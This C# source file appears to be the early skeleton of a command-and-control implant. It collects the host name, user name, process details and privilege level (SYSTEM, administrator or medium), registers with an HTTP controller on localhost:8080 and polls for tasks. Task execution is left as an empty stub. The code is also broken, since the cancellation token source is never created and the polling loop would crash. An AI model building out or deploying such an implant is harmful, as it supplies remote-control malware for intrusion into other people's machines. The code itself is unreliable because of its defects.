using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {

        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        static void Main(string[] args)
        {
            GenerateMetadata();
            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                { 
                    // action tasks 
                
                }
            
            }

        }

        public void Stop()
        {
            _tokenSource.Cancel();

        }

        static void GenerateMetadata()
        {

            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";

            }

            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = Environment.UserName,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"

            };

            process.Dispose();
            identity.Dispose();
        }

    }
}
